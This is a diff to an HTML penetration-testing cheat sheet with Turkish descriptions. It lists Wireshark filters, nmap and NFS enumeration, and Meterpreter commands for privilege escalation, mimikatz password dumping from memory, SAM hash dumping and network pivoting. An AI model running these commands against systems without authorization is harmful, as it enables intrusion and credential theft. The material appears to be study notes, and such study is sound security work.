@@ -68,7 +68,7 @@
 <div class="tabcontent" id="Wireshark-Nmap">
   <table>
     <tr><th>Wireshark Filtreleri</th><th>Description</th></tr>
-    <tr><td class="kod">ip.addr==ip</td><td class="desc">ip ye göre filtreleme yapar</td></tr>
+    <tr><td class="kod">ip.addr==ip</td><td class="desc">ip ye göre filtreleme yapar | ip.src ip.dst</td></tr>
     <tr><td class="kod">ip.addr==ip1  && ip.addr==ip2</td><td class="desc">İki ip arasındaki paketleri filtreler</td></tr>
     <tr><td class="kod">tcp.port==80</td><td class="desc">Sadece 80 portundan yapılan tcp trafiği.</td></tr>
     <tr><td class="kod">tcp contains traffic</td><td class="desc">'traffic' kelimesini içeren tcp paketleri <b>string araması</b>.</td></tr>
@@ -79,11 +79,11 @@
 
     <tr><td><br></td></tr>
     <tr><th>Nmap Komutları</th><th>Description</th></tr>
-    <tr><td class="kod">nmap -sS -sV -sC -T4 ip | tee out</td><td class="desc">SYN tarama. Version, Script taraması.</td></tr>
+    <tr><td class="kod">nmap -sS -sV -sC -T4 ip | tee out</td><td class="desc">SYN tarama. Version, Script taraması. <b>-p- Tüm portları tara</b></td></tr>
     <tr><td class="kod">nmap -sU ip | tee out</td><td class="desc">SNMP için udp taraması - snmp port 161</td></tr>
     <tr><td class="kod">nmap -sn 172.18.90.0/24 | awk '/192/{print $5}' | tee iplist.txt</td><td class="desc">Networkte acık olan pcleri iplist.txt ye yazar.</td></tr>
     <tr><td class="kod">locate *.nse</td><td class="desc">tum nmap scriptleri</td></tr>
-    <tr><td class="kod">nmap -sV —script nfs-showmount ip</td><td class="desc">İpdeki paylaşımda olan klasörleri gösterir.</td></tr>
+    <tr><td class="kod">nmap -sV —script nfs-showmount -iL iplist.txt</td><td class="desc">İpdeki paylaşımda olan klasörleri gösterir.</td></tr>
     <tr><td class="kod">showmount -e [ip]</td><td class="desc">hedefteki paylaşılan dosyaları gösterir</td></tr>
     <tr><td class="kod">mount -t nfs [ip]:/dizin /mnt/dizin</td><td class="desc">paylasılan nfs'yi mount etme.</td></tr>
   </table>
@@ -121,15 +121,20 @@
     <tr><td><br></td></tr>
     <tr><th>Meterpreter Komutları</th><th>Description</th></tr>
     <tr><td>execute -F cmd.exe</td><td>Process başlatma</td></tr>
-    <tr><td>getsystem</td><td>Yetki yükseltme</td></tr>
-    <tr><td>use mimikatz</td><td>Ramden sifreleri okur.</td></tr>
+    <tr><td>getuid</td><td>Useri gosterir</td></tr>
+    <tr><td>getsystem</td><td>Sistem yükseltme</td></tr>
+    <tr><td>use mimikatz</td><td>Mimikatz baslatır.</td></tr>
+    <tr><td>mimikatz_command –f sekurlsa::logonPasswords</td><td>Ramden sifreleri okur.</td></tr>
     <tr><td>hashdump</td><td>SAM Databaseden hashli sifreleri alır. 31d6 sifre yok demektir</td></tr>
 
 
     <tr><td><br></td></tr>
     <tr><th>Pivoting</th><th>Description</th></tr>
-    <tr><td>portfwd add -l 4444 -p 21 -r [IP]</td><td>Meterpreter: -l kaliport -p kurbanport -r kurbanip</td></tr>
     <tr><td class="kod">route add [ip] [mask] [session]</td><td class="desc">Kurbanın ip si verilir./32</td></tr>
+    <tr><td class="kod">Meterpreter : ifconfig</td><td class="desc">Kurbanın baglı olduğu networkler görünür.</td></tr>
+    <tr><td class="kod">run autoroute -s [subnet]/24</td><td class="desc">Subnet otomatik route ekleme.</td></tr>
+    <tr><td class="kod">auxiliary/scanner/portscan/tcp</td><td class="desc">Subnette port tarama modülü.</td></tr>
+    <tr><td>portfwd add -l 4444 -p 21 -r [IP]</td><td>Meterpreter: -l kaliport -p kurbanport -r kurbanip</td></tr>
 
     <tr><td><br></td></tr>
     <tr><th>Hydra</th><th>Description</th></tr>
